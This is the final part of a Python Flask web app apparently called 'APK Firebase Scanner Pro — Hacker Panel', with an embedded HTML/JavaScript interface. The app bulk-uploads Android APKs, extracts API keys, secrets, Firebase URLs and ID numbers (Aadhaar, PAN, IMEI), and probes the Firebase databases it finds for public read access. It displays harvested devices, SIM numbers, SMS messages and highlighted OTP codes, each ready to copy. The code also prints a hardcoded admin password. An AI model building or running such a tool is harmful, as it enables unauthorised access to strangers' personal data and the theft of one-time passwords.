        <div class="drop-z" id="singleDrop" onclick="document.getElementById('singleFile').click()">
          <input type="file" id="singleFile" name="apk" accept=".apk" onchange="setSingle(this)"/>
          <div class="dz-ico">📱</div>
          <div class="dz-t">Drop APK Here</div>
          <div class="dz-s" id="singleName">or click to select</div>
          <div class="file-tags"><span class="ftag ft-r">.APK</span><span class="ftag ft-a">Max 200MB</span></div>
        </div>
        <button type="button" class="btn-primary" onclick="scanSingle()">🔍 SCAN & PROBE</button>
      </form>
    </div>
    <!-- Bulk APK -->
    <div class="ucard uc-bulk">
      <div class="ucard-h" style="color:var(--red2);">🔥 Bulk APK Upload</div>
      <div class="ucard-s">Drop multiple APKs — all scanned &amp; probed, results merged</div>
      <div class="drop-z red-z" id="bulkDrop" onclick="document.getElementById('bulkFile').click()">
        <input type="file" id="bulkFile" multiple accept=".apk" onchange="queueAPKs(this.files)"/>
        <div class="dz-ico" style="filter:drop-shadow(0 0 18px rgba(255,34,68,.5));">📦</div>
        <div class="dz-t" style="color:var(--red2);">DROP MULTIPLE APKs</div>
        <div class="dz-s">Select any number at once</div>
        <div class="file-tags"><span class="ftag ft-r">.APK</span><span class="ftag ft-r">BULK</span><span class="ftag ft-a">ANY SIZE</span></div>
      </div>
      <div class="queue-box" id="queueBox">
        <div class="q-header">Queue: <span id="qCount">0</span> APKs ready</div>
        <div class="q-list" id="qList"></div>
        <div style="display:flex;gap:8px;margin-top:10px;">
          <button class="btn-red" style="margin:0;flex:1;padding:11px;" onclick="processBulk()">🔥 SCAN ALL → EXTRACT</button>
          <button class="btn-sm bs-r" onclick="clearQ()">✕</button>
        </div>
      </div>
      <div class="gprog" id="gprog">
        <div class="gprog-head"><span class="gprog-label" id="gpLabel">Processing...</span><span class="gprog-count" id="gpCount">0/0</span></div>
        <div class="pbar"><div class="pbar-fill" id="gpFill"></div></div>
        <div class="gprog-file" id="gpFile">—</div>
      </div>
    </div>
  </div>

  <!-- LOADING -->
  <div id="loading" style="display:none;text-align:center;padding:40px;animation:fadeUp .3s ease;">
    <div class="spin" style="width:36px;height:36px;margin:0 auto 14px;"></div>
    <div style="font-size:14px;font-weight:700;font-family:'Orbitron',monospace;color:var(--cyan);">Scanning APK...</div>
    <div id="loadMsg" style="font-size:12px;color:var(--sub);margin-top:6px;">Decompiling, scanning resources, probing Firebase databases...</div>
  </div>

  <!-- RESULTS -->
  <div id="results" style="display:none;" class="results">
    <!-- Stats bar -->
    <div class="stats-bar" id="statsBar"></div>

    <!-- Firebase probe results -->
    <div id="fbProbeSection" style="display:none;">
      <div class="sec-hdr">🔌 Firebase Database Probes</div>
      <div id="fbProbeResults"></div>
    </div>

    <!-- APK findings grid -->
    <div class="sec-hdr">🔍 APK Extracted Findings</div>
    <div class="findings-grid" id="findingsGrid"></div>
  </div>

  <!-- ERROR -->
  <div id="errorBox" style="display:none;background:var(--red-dim);border:1px solid var(--rborder2);border-radius:12px;padding:14px 18px;color:var(--red2);font-size:13px;font-weight:600;margin-bottom:18px;"></div>
</div>

<div class="toast" id="toast"></div>

<script>
let apkQueue = [];

// ─── Drag events ──────────────────────────────────────────────────────────────
['singleDrop','bulkDrop'].forEach(id=>{
  const el=document.getElementById(id);
  if(!el) return;
  el.addEventListener('dragover',e=>{e.preventDefault();el.classList.add('dg');});
  el.addEventListener('dragleave',()=>el.classList.remove('dg'));
  el.addEventListener('drop',e=>{
    e.preventDefault();el.classList.remove('dg');
    const files=[...e.dataTransfer.files].filter(f=>f.name.toLowerCase().endsWith('.apk'));
    if(id==='singleDrop'){ if(files[0]){document.getElementById('singleFile').files=e.dataTransfer.files;setSingle({files});} }
    else { queueAPKs(files); }
  });
});

function setSingle(inp){
  if(!inp.files||!inp.files[0]) return;
  document.getElementById('singleName').textContent='Selected: '+inp.files[0].name;
}

// ─── Queue ────────────────────────────────────────────────────────────────────
function queueAPKs(files){
  [...files].forEach(f=>{ if(f.name.toLowerCase().endsWith('.apk')) apkQueue.push(f); });
  renderQ();
  showToast(files.length+' APK(s) added to queue');
}
function renderQ(){
  const box=document.getElementById('queueBox');
  const list=document.getElementById('qList');
  const cnt=document.getElementById('qCount');
  if(!apkQueue.length){box.style.display='none';return;}
  box.style.display='block';
  cnt.textContent=apkQueue.length;
  list.innerHTML=apkQueue.map((f,i)=>`
    <div class="q-item" id="qi${i}">
      <span>📦</span>
      <span class="q-name">${f.name}</span>
      <span class="q-sz">${fmtBytes(f.size)}</span>
      <span class="q-st" id="qst${i}" style="color:var(--sub)">Queued</span>
      <span class="q-rm" onclick="rmQ(${i})">✕</span>
    </div>`).join('');
}
function rmQ(i){apkQueue.splice(i,1);renderQ();}
function clearQ(){apkQueue=[];renderQ();document.getElementById('gprog').style.display='none';}

// ─── Single scan ──────────────────────────────────────────────────────────────
async function scanSingle(){
  const inp=document.getElementById('singleFile');
  if(!inp.files||!inp.files[0]){showToast('Select an APK first');return;}
  const file=inp.files[0];
  showLoading('Scanning '+file.name+'...');
  const data=await uploadAPK(file);
  hideLoading();
  if(data.error){showError(data.error);return;}
  renderResults([data]);
}

// ─── Bulk scan — PARALLEL (4 APKs at once) ────────────────────────────────────
async function processBulk(){
  if(!apkQueue.length){showToast('Queue is empty');return;}
  const total=apkQueue.length;
  const gp=document.getElementById('gprog');
  const fill=document.getElementById('gpFill');
  const label=document.getElementById('gpLabel');
  const cnt=document.getElementById('gpCount');
  const fileLbl=document.getElementById('gpFile');
  gp.style.display='block';
  label.textContent='Uploading & scanning in parallel...';
  fileLbl.textContent='Processing '+total+' APKs concurrently (4 at a time)...';

  let done=0;
  const allResults=[];
  const CONCURRENCY=4; // run 4 APKs at the same time

  // Chunk into batches
  for(let i=0;i<apkQueue.length;i+=CONCURRENCY){
    const batch=apkQueue.slice(i,i+CONCURRENCY);
    // Mark batch as scanning
    batch.forEach((_,j)=>{
      const st=document.getElementById('qst'+(i+j));
      if(st){st.textContent='⚡ Scanning...';st.style.color='var(--cyan)';}
    });
    cnt.textContent=Math.min(i+CONCURRENCY,total)+' / '+total;
    fileLbl.textContent='Scanning: '+batch.map(f=>f.name.replace('.apk','')).join(', ');
    // Launch all in batch simultaneously
    const settled=await Promise.allSettled(batch.map(f=>uploadAPK(f)));
    settled.forEach((res,j)=>{
      const idx=i+j;
      const st=document.getElementById('qst'+idx);
      if(res.status==='fulfilled'&&!res.value.error){
        allResults.push(res.value);
        if(st){st.textContent='✓ Done';st.style.color='var(--mint)';}
      }else{
        if(st){st.textContent='✗ Error';st.style.color='var(--red)';}
      }
      done++;
    });
    fill.style.width=Math.round((done/total)*100)+'%';
    // Show partial results immediately after each batch
    if(allResults.length) renderResults(allResults);
  }
  label.textContent='✓ Done! '+allResults.length+'/'+total+' scanned';
  fileLbl.textContent='All done — results shown below';
  showToast(allResults.length+' APKs scanned!');
  setTimeout(()=>{apkQueue=[];renderQ();},3000);
}

// ─── Upload & scan API call ───────────────────────────────────────────────────
async function uploadAPK(file){
  const fd=new FormData();
  fd.append('apk',file);
  try{
    const r=await fetch('/admin/scan',{method:'POST',body:fd});
    return await r.json();
  }catch(e){
    return {error:'Upload failed: '+e.message};
  }
}

// ─── Render results ───────────────────────────────────────────────────────────
function renderResults(allData){
  document.getElementById('results').style.display='block';
  document.getElementById('errorBox').style.display='none';
  // Aggregate stats across all scans
  let totalDevices=0,totalSms=0,totalPhones=0,totalKeys=0,totalUrls=0,totalSecrets=0;
  const allFbResults=[];
  const allFindings={};
  for(const d of allData){
    if(d.firebase_probes){
      for(const [url,probe] of Object.entries(d.firebase_probes)){
        totalDevices+=probe.devices?.length||0;
        totalSms+=probe.sms?.length||0;
        totalPhones+=probe.phones?.length||0;
        allFbResults.push(probe);
      }
    }
    if(d.findings){
      totalKeys+=(d.findings['API Keys']||[]).length;
      totalUrls+=(d.findings['Database URLs']||[]).length;
      totalSecrets+=(d.findings['Secrets']||[]).length;
      for(const [k,v] of Object.entries(d.findings)){
        if(!allFindings[k]) allFindings[k]=[];
        if(Array.isArray(v)) allFindings[k].push(...v);
      }
    }
  }
  // Stats
  document.getElementById('statsBar').innerHTML=`
    <div class="stat-c"><div class="stat-n" style="color:var(--cyan)">${totalDevices}</div><div class="stat-l">Devices Found</div></div>
    <div class="stat-c"><div class="stat-n" style="color:var(--mint)">${totalSms}</div><div class="stat-l">SMS Records</div></div>
    <div class="stat-c"><div class="stat-n" style="color:var(--sky)">${totalPhones}</div><div class="stat-l">Phone Numbers</div></div>
    <div class="stat-c"><div class="stat-n" style="color:var(--amber)">${totalKeys}</div><div class="stat-l">API Keys</div></div>
    <div class="stat-c"><div class="stat-n" style="color:var(--red2)">${totalSecrets}</div><div class="stat-l">Secrets Found</div></div>
    <div class="stat-c"><div class="stat-n" style="color:var(--lilac)">${totalUrls}</div><div class="stat-l">Firebase URLs</div></div>`;
  // Firebase probes
  if(allFbResults.length){
    document.getElementById('fbProbeSection').style.display='block';
    document.getElementById('fbProbeResults').innerHTML=allFbResults.map(r=>renderFbProbe(r)).join('');
  }
  // Findings
  document.getElementById('findingsGrid').innerHTML=renderFindingsGrid(allFindings);
  document.getElementById('results').scrollIntoView({behavior:'smooth'});
}

function renderFbProbe(r){
  const on=r.devices.filter(d=>d.status).length;
  const off=r.devices.filter(d=>!d.status).length;
  let html=`<div class="fb-result-card">
    <div class="fb-url">🔗 ${esc(r.url)}</div>
    <span class="vuln-badge ${r.vulnerable?'vb-open':'vb-secure'}">${r.vulnerable?'🔓 VULNERABLE — Public Read Access':'🔒 Secure'}</span>`;

  if(r.endpoints&&r.endpoints.length){
    html+=`<div style="margin-bottom:12px;"><div style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:6px;">📡 Open Endpoints</div>
      <div style="display:flex;flex-wrap:wrap;gap:5px;">`;
    for(const ep of r.endpoints){
      html+=`<span style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:3px 8px;font-size:9px;font-family:'JetBrains Mono',monospace;cursor:pointer;" onclick="copyT('${esc(ep.url)}')">${ep.path||'/'} <span style="color:var(--cyan)">${ep.count}</span></span>`;
    }
    html+=`</div></div>`;
  }

  // Devices table
  if(r.devices&&r.devices.length){
    html+=`<div style="margin-bottom:12px;"><div style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:6px;">📱 Devices (${r.devices.length}) — 🟢 ${on} Online  🔴 ${off} Offline</div>
      <div class="tbl-wrap"><table class="dev-table"><thead><tr><th>Name / Model</th><th>Phone</th><th>SIM Numbers</th><th>IMEI</th><th>Battery</th><th>Status</th></tr></thead><tbody>`;
    for(const d of r.devices.slice(0,100)){
      html+=`<tr>
        <td style="font-weight:700">${esc(d.name||d.model||'Unknown')}</td>
        <td style="color:var(--cyan);font-family:'JetBrains Mono',monospace;cursor:pointer;" onclick="copyT('${esc(d.phone)}')">${esc(d.phone||'—')}</td>
        <td style="font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--mint)">${(d.sim_numbers||[]).join(', ')||'—'}</td>
        <td style="font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--sub)">${esc(d.imei||'—')}</td>
        <td>${d.battery!=null?d.battery+'%':'—'}</td>
        <td><span class="badge ${d.status?'b-on':'b-off'}">${d.status?'Online':'Offline'}</span></td>
      </tr>`;
    }
    html+=`</tbody></table></div></div>`;
  }

  // SMS
  if(r.sms&&r.sms.length){
    html+=`<div><div style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:8px;">💬 SMS Messages (${r.sms.length})</div>`;
    for(const s of r.sms.slice(0,30)){
      html+=`<div class="sms-bub ${s.otp?'has-otp':''}">
        <div class="sms-meta">
          <span class="sms-from">${esc(s.sender||'Unknown')}</span>
          ${s.otp?`<span class="otp-hl" onclick="copyT('${s.otp}')">OTP: ${s.otp}</span>`:''}
        </div>
        <div class="sms-body">${esc((s.body||'').substring(0,300))}</div>
      </div>`;
    }
    html+=`</div>`;
  }

  // Phones found
  if(r.phones&&r.phones.length){
    html+=`<div style="margin-top:10px;"><div style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--sub);margin-bottom:6px;">📞 Phone Numbers (${r.phones.length})</div>
      <div>`;
    for(const p of r.phones.slice(0,50)){
      html+=`<span class="tag t-g" onclick="copyT('${esc(p)}')">${esc(p)}</span>`;
    }
    html+=`</div></div>`;
  }

  html+=`</div>`;
  return html;
}

function renderFindingsGrid(findings){
  const sections=[
    {key:'API Keys',     icon:'🔑', cls:'t-a', label:'API Keys'},
    {key:'Secrets',      icon:'🔐', cls:'t-r', label:'Secrets/Passwords'},
    {key:'Database URLs',icon:'🌐', cls:'t-g', label:'Firebase URLs'},
    {key:'Storage Buckets',icon:'🪣',cls:'',  label:'Storage Buckets'},
    {key:'App IDs',      icon:'📱', cls:'',   label:'App IDs'},
    {key:'Emails',       icon:'📧', cls:'',   label:'Emails'},
    {key:'Phones',       icon:'📞', cls:'t-g',label:'Phone Numbers'},
    {key:'IMEI',         icon:'🔢', cls:'',   label:'IMEI Numbers'},
    {key:'Aadhaar',      icon:'🪪', cls:'t-r',label:'Aadhaar IDs'},
    {key:'PAN',          icon:'📄', cls:'',   label:'PAN Cards'},
    {key:'SIM Serials',  icon:'📡', cls:'',   label:'SIM Serials'},
    {key:'Project IDs',  icon:'🏗️', cls:'',   label:'Project IDs'},
  ];
  let html='';
  for(const s of sections){
    const items=[...new Set(findings[s.key]||[])];
    html+=`<div class="fc ${s.cls==='t-r'?'fc-r':''}">
      <div class="fc-t">${s.icon} ${s.label}<span class="${s.cls==='t-r'?'cnt-badge-r':'cnt-badge'}">${items.length}</span></div>`;
    if(items.length){
      html+=items.slice(0,50).map(i=>`<span class="tag ${s.cls}" onclick="copyT('${esc(i)}')" title="${esc(i)}">${esc(String(i).substring(0,45))}</span>`).join('');
    }else{
      html+=`<div class="empty-state">None found</div>`;
    }
    html+=`</div>`;
  }
  return html;
}

// ─── Utils ────────────────────────────────────────────────────────────────────
function showLoading(msg){
  document.getElementById('loading').style.display='block';
  document.getElementById('results').style.display='none';
  document.getElementById('errorBox').style.display='none';
  if(msg) document.getElementById('loadMsg').textContent=msg;
}
function hideLoading(){document.getElementById('loading').style.display='none';}
function showError(msg){
  document.getElementById('errorBox').textContent='❌ '+msg;
  document.getElementById('errorBox').style.display='block';
  hideLoading();
}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function fmtBytes(b){if(b<1024)return b+'B';if(b<1048576)return(b/1024).toFixed(1)+'KB';return(b/1048576).toFixed(1)+'MB';}
function copyT(t){
  navigator.clipboard.writeText(t).catch(()=>{const x=document.createElement('textarea');x.value=t;document.body.appendChild(x);x.select();document.execCommand('copy');x.remove();});
  showToast('Copied!');
}
let _tt;
function showToast(m){
  const el=document.getElementById('toast');el.textContent=m;el.classList.add('show');
  clearTimeout(_tt);_tt=setTimeout(()=>el.classList.remove('show'),2500);
}
</script>
</body>
</html>"""


# ──────────────────────────────────────────────────────────────────────────────
# ROUTES
# ──────────────────────────────────────────────────────────────────────────────

def admin_required(f):
    from functools import wraps
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get('admin'):
            return redirect('/admin')
        return f(*args, **kwargs)
    return wrapper


@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin'):
        return redirect('/admin/scan')
    error = None
    if request.method == 'POST':
        pwd = request.form.get('password', '')
        if pwd == ADMIN_PASSWORD:
            session['admin'] = True
            return redirect('/admin/scan')
        error = '❌ Wrong password. Try again.'
    return render_template_string(LOGIN_HTML, error=error)


@app.route('/admin/logout')
def admin_logout():
    session.clear()
    return redirect('/admin')


@app.route('/admin/scan', methods=['GET'])
@admin_required
def admin_scanner():
    return render_template_string(SCANNER_HTML)


@app.route('/admin/scan', methods=['POST'])
@admin_required
def admin_scan_api():
    """JSON API: upload APK → scan → probe Firebase → return results."""
    if 'apk' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400

    f = request.files['apk']
    if not f.filename.lower().endswith('.apk'):
        return jsonify({'error': 'Only .apk files are accepted'}), 400

    apk_bytes = f.read()
    if not apk_bytes:
        return jsonify({'error': 'Empty file received'}), 400

    findings, db_checks, err = scan_apk(apk_bytes, f.filename)
    if err:
        return jsonify({'error': err}), 400

    # Serialize firebase probes into JSON-safe dicts
    fb_probes_out = {}
    if db_checks:
        for url, probe in db_checks.items():
            fb_probes_out[url] = {
                'url': probe.get('url', url),
                'vulnerable': probe.get('vulnerable', False),
                'endpoints': probe.get('endpoints', []),
                'devices': probe.get('devices', []),
                'sms': probe.get('sms', []),
                'phones': probe.get('phones', []),
                'total_records': probe.get('total_records', 0),
            }

    return jsonify({
        'filename': f.filename,
        'findings': findings,
        'firebase_probes': fb_probes_out,
    })


# Redirect root to admin
@app.route('/')
def root():
    return redirect('/admin')


# ──────────────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    print('=' * 55)
    print('  🔥 APK Firebase Scanner Pro — Hacker Panel')
    print('  Admin path : http://0.0.0.0:5002/admin')
    print('  Password   : Tanmay1122@')
    print('=' * 55)
    app.run(host='0.0.0.0', port=5002, debug=False, threaded=True)
